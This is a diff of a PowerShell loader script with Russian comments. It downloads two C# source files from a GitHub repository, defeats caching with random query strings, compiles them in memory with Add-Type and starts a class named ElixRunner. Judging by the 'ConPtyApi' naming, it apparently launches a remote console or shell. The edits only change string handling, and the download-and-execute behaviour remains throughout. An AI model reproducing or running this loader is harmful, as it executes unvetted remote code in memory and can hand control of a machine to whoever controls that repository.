@@ -1,23 +1,22 @@
-
-$u1_raw = "https://raw.githubusercontent.com/Metivzora/RS/main/ConPtyApi.cs"
-$u2_raw = "https://raw.githubusercontent.com/Metivzora/RS/main/Runner.cs"
-
-
-$uri1 = [System.Uri]($u1_raw.Trim() + "?v=" + (Get-Random))
-$uri2 = [System.Uri]($u2_raw.Trim() + "?v=" + (Get-Random))
+# Указываем ссылки с генерацией случайного числа для обхода кэша
+$uri1 = "https://raw.githubusercontent.com/Metivzora/RS/main/ConPtyApi.cs?v=" + (Get-Random)
+$uri2 = "https://raw.githubusercontent.com/Metivzora/RS/main/Runner.cs?v=" + (Get-Random)
 
 $web = New-Object System.Net.WebClient
 try {
-    $c1 = $web.DownloadString($uri1)
-    $c2 = $web.DownloadString($uri2)
+    # Скачиваем код. Принудительно приводим каждую переменную к строгому типу String
+    [string]$c1 = $web.DownloadString($uri1)
+    [string]$c2 = $web.DownloadString($uri2)
 
     if ($c1 -and $c2) {
-        # Явное объединение строк с помощью оператора -join
-        # Это преобразует любые данные строго в одиночную строку String
-        $fullCode = @($c1, $c2) -join [System.Environment]::NewLine
+        # Используем метод [string]::Concat — это нативный метод .NET для сборки строк.
+        # Он принимает любые объекты и гарантированно возвращает ОДНУ строку [string]
+        $fullCode = [string]::Concat($c1, [System.Environment]::NewLine, $c2)
         
+        # Компилируем строго текстовые данные
         Add-Type -TypeDefinition $fullCode
 
+        # Запуск
         [ElixRunner]::Start()
     }
 } catch {
